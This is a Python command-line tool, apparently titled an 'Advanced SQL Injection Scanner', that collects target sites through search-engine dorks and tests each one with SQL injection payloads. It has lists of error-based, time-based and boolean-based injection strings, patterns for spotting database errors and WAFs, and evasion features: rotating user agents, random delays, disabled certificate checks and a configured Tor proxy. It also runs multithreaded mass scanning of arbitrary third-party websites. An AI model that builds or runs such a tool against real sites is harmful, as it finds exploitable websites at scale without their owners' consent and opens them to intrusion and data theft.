import requests
from bs4 import BeautifulSoup
import time
from urllib.parse import quote, unquote, urlparse, parse_qs
from colorama import Fore, Style, init
import random
import argparse
import urllib3
import concurrent.futures
from queue import Queue
from threading import Lock
import json
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init()

class SQLInjectionScanner:
    def __init__(self, max_threads=10):
        self.max_threads = max_threads
        self.results = []
        self.results_lock = Lock()
        self.print_lock = Lock()
        
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        }
        
        # SQL Injection payloads
        self.payloads = {
            'error_based': [
                "'", 
                "1'", 
                "1' OR '1'='1",
                "1' AND '1'='1",
                "1' ORDER BY 1--",
                "1' UNION SELECT NULL--",
                "1' AND ERROR()",
            ],
            'time_based': [
                "1' AND SLEEP(2)--",
                "1' AND BENCHMARK(5000000,ENCODE('MSG','by 5 seconds'))--",
                "1') AND SLEEP(2)--",
                "1' WAITFOR DELAY '0:0:2'--"
            ],
            'boolean_based': [
                "1' AND 1=1--",
                "1' AND 1=2--",
                "1' AND 'a'='a",
                "1' AND 'a'='b"
            ]
        }
        
        # Error patterns
        self.error_signs = {
            'mysql': [
                'mysql_fetch_array()',
                'mysql_num_rows()',
                'MySQL Error',
                'SQL syntax',
                'Warning: mysql',
                'mysqli_fetch_array',
                'Unknown column'
            ],
            'postgresql': [
                'PG::Error',
                'PostgreSQL ERROR',
                'PSQLException'
            ],
            'mssql': [
                'Microsoft SQL Native Client error',
                'SQL Server Error',
                'Unclosed quotation mark'
            ]
        }
        
        # WAF signatures
        self.waf_signatures = {
            'Cloudflare': ['CF-RAY', '__cfduid'],
            'ModSecurity': ['ModSecurity', 'NAXSI'],
            'AWS WAF': ['AWS', 'amazon'],
            'Imperva': ['X-Iinfo', 'visid_incap'],
            'F5 BIG-IP': ['BigIP', 'F5']
        }
        
        # Add proxy support
        self.proxies = {
            'http': 'socks5h://127.0.0.1:9050',  # Tor proxy
            'https': 'socks5h://127.0.0.1:9050'
        }

    def safe_print(self, message):
        """Thread-safe printing"""
        with self.print_lock:
            print(message)

    def detect_waf(self, response):
        """Detect if WAF is present"""
        detected = []
        for waf, sigs in self.waf_signatures.items():
            if any(sig.lower() in str(response.headers).lower() for sig in sigs):
                detected.append(waf)
        return detected

    def search_google(self, dork, page=0):
        """Search using Google dork"""
        try:
            # Rotating User-Agents
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/91.0.864.48',
                'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0'
            ]

            # Update headers with random User-Agent
            self.headers['User-Agent'] = random.choice(user_agents)
            
            # Use different search engines
            search_engines = {
                'google': f"https://www.google.com/search?q={quote(dork)}&start={page*10}",
                'bing': f"https://www.bing.com/search?q={quote(dork)}&first={page*10}",
                'yahoo': f"https://search.yahoo.com/search?p={quote(dork)}&b={page*10}"
            }

            results = []
            for engine, url in search_engines.items():
                try:
                    self.safe_print(f"{Fore.CYAN}[*] Searching {engine}: {dork} (Page {page+1}){Style.RESET_ALL}")
                    
                    response = requests.get(
                        url, 
                        headers=self.headers, 
                        timeout=10,
                        verify=False
                    )
                    
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Google parsing
                    if engine == 'google':
                        for div in soup.find_all('div', class_='g'):
                            link = div.find('a')
                            if link and 'href' in link.attrs:
                                url = link['href']
                                if url.startswith('http') and 'google.com' not in url:
                                    results.append(url)
                                    self.safe_print(f"{Fore.GREEN}[+] Found: {url}{Style.RESET_ALL}")
                    
                    # Bing parsing
                    elif engine == 'bing':
                        for link in soup.find_all('a', class_='sh_favicon'):
                            if 'href' in link.attrs:
                                url = link['href']
                                if url.startswith('http'):
                                    results.append(url)
                                    self.safe_print(f"{Fore.GREEN}[+] Found: {url}{Style.RESET_ALL}")
                    
                    # Yahoo parsing
                    elif engine == 'yahoo':
                        for link in soup.find_all('a', class_=' ac-algo fz-l ac-21th lh-24'):
                            if 'href' in link.attrs:
                                url = link['href']
                                if url.startswith('http'):
                                    results.append(url)
                                    self.safe_print(f"{Fore.GREEN}[+] Found: {url}{Style.RESET_ALL}")
                    
                    time.sleep(random.uniform(2, 4))  # Random delay between requests
                    
                except Exception as e:
                    self.safe_print(f"{Fore.RED}[!] Error with {engine}: {str(e)}{Style.RESET_ALL}")
                    continue
                    
            return list(set(results))  # Remove duplicates
            
        except Exception as e:
            self.safe_print(f"{Fore.RED}[!] Search error: {str(e)}{Style.RESET_ALL}")
            return []

    def test_url(self, url):
        """Test URL for SQL injection vulnerabilities"""
        vulnerabilities = []
        try:
            # Get original response
            original = requests.get(url, headers=self.headers, verify=False, timeout=10)
            original_content = original.text
            
            # Check for WAF
            waf = self.detect_waf(original)
            if waf:
                self.safe_print(f"{Fore.YELLOW}[!] WAF Detected: {', '.join(waf)}{Style.RESET_ALL}")

            # Test different types of payloads
            for payload_type, payloads in self.payloads.items():
                for payload in payloads:
                    try:
                        test_url = url.replace('=', f'={payload}')
                        self.safe_print(f"{Fore.YELLOW}[*] Testing: {test_url}{Style.RESET_ALL}")
                        
                        start_time = time.time()
                        response = requests.get(test_url, headers=self.headers, verify=False, timeout=10)
                        execution_time = time.time() - start_time
                        
                        # Check for SQL errors
                        for db, errors in self.error_signs.items():
                            for error in errors:
                                if error in response.text and error not in original_content:
                                    vulnerabilities.append({
                                        'url': test_url,
                                        'type': 'error_based',
                                        'payload': payload,
                                        'database': db,
                                        'error': error
                                    })
                                    self.safe_print(f"{Fore.RED}[!] SQL Injection Found! Type: Error-based{Style.RESET_ALL}")
                        
                        # Check time-based injection
                        if payload_type == 'time_based' and execution_time > 2:
                            vulnerabilities.append({
                                'url': test_url,
                                'type': 'time_based',
                                'payload': payload,
                                'execution_time': execution_time
                            })
                            self.safe_print(f"{Fore.RED}[!] SQL Injection Found! Type: Time-based{Style.RESET_ALL}")
                            
                        # Check boolean-based
                        if payload_type == 'boolean_based':
                            if abs(len(response.text) - len(original_content)) > 50:
                                vulnerabilities.append({
                                    'url': test_url,
                                    'type': 'boolean_based',
                                    'payload': payload,
                                    'content_diff': abs(len(response.text) - len(original_content))
                                })
                                self.safe_print(f"{Fore.RED}[!] SQL Injection Found! Type: Boolean-based{Style.RESET_ALL}")
                                
                    except requests.Timeout:
                        if payload_type == 'time_based':
                            vulnerabilities.append({
                                'url': test_url,
                                'type': 'time_based',
                                'payload': payload,
                                'note': 'Timeout occurred'
                            })
                    except Exception as e:
                        continue

        except Exception as e:
            self.safe_print(f"{Fore.RED}[!] Error testing {url}: {str(e)}{Style.RESET_ALL}")
            
        return vulnerabilities

    def scan(self, dork=None, urls=None, pages=3):
        """Main scanning function"""
        start_time = time.time()
        total_urls = []
        
        # Collect URLs from dork if provided
        if dork:
            self.safe_print(f"{Fore.CYAN}[*] Starting dork scan: {dork}{Style.RESET_ALL}")
            for page in range(pages):
                results = self.search_google(dork, page)
                total_urls.extend(results)
                if results:
                    time.sleep(random.uniform(2, 4))
        
        # Add URLs from file/argument if provided
        if urls:
            total_urls.extend(urls)
        
        # Remove duplicates
        total_urls = list(set(total_urls))
        
        if not total_urls:
            self.safe_print(f"{Fore.YELLOW}[!] No URLs found to scan{Style.RESET_ALL}")
            return
        
        self.safe_print(f"{Fore.CYAN}[*] Found {len(total_urls)} unique URLs to scan{Style.RESET_ALL}")
        
        # Test URLs with threading
        vulnerabilities = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            future_to_url = {executor.submit(self.test_url, url): url for url in total_urls}
            for future in concurrent.futures.as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    vulns = future.result()
                    if vulns:
                        vulnerabilities.extend(vulns)
                except Exception as e:
                    self.safe_print(f"{Fore.RED}[!] Error scanning {url}: {str(e)}{Style.RESET_ALL}")
        
        # Save results
        self.save_results(vulnerabilities, total_urls, time.time() - start_time)
        
        return vulnerabilities

    def save_results(self, vulnerabilities, scanned_urls, duration):
        """Save scan results"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # Save detailed JSON report
        report = {
            'scan_info': {
                'timestamp': timestamp,
                'duration': f"{duration:.2f} seconds",
                'urls_scanned': len(scanned_urls),
                'vulnerabilities_found': len(vulnerabilities)
            },
            'vulnerable_urls': vulnerabilities,
            'scanned_urls': scanned_urls
        }
        
        json_file = f"scan_report_{timestamp}.json"
        with open(json_file, 'w') as f:
            json.dump(report, f, indent=4)
        
        # Save simple text report
        txt_file = f"vulnerabilities_{timestamp}.txt"
        with open(txt_file, 'w') as f:
            f.write("=== SQL Injection Scan Report ===\n\n")
            f.write(f"Scan completed in: {duration:.2f} seconds\n")
            f.write(f"URLs scanned: {len(scanned_urls)}\n")
            f.write(f"Vulnerabilities found: {len(vulnerabilities)}\n\n")
            
            if vulnerabilities:
                f.write("=== Vulnerable URLs ===\n\n")
                for vuln in vulnerabilities:
                    f.write(f"URL: {vuln['url']}\n")
                    f.write(f"Type: {vuln['type']}\n")
                    f.write(f"Payload: {vuln['payload']}\n")
                    if 'database' in vuln:
                        f.write(f"Database: {vuln['database']}\n")
                    if 'error' in vuln:
                        f.write(f"Error: {vuln['error']}\n")
                    if 'execution_time' in vuln:
                        f.write(f"Execution Time: {vuln['execution_time']:.2f}s\n")
                    f.write("\n")
        
        self.safe_print(f"\n{Fore.GREEN}[+] Scan completed!")
        self.safe_print(f"[+] Scanned {len(scanned_urls)} URLs")
        self.safe_print(f"[+] Found {len(vulnerabilities)} vulnerabilities")
        self.safe_print(f"[+] Detailed report saved to: {json_file}")
        self.safe_print(f"[+] Text report saved to: {txt_file}{Style.RESET_ALL}")

def main():
    parser = argparse.ArgumentParser(description='Advanced SQL Injection Scanner')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('--dork', help='Google dork to search')
    group.add_argument('-u', '--url', help='Single URL to test')
    group.add_argument('-f', '--file', help='File containing URLs')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('-p', '--pages', type=int, default=3, help='Number of dork pages to scan (default: 3)')
    
    args = parser.parse_args()
    
    scanner = SQLInjectionScanner(max_threads=args.threads)
    
    try:
        urls = []
        if args.url:
            urls = [args.url]
        elif args.file:
            with open(args.file) as f:
                urls = [line.strip() for line in f if line.strip()]
        
        scanner.scan(dork=args.dork, urls=urls, pages=args.pages)
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Scan interrupted by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
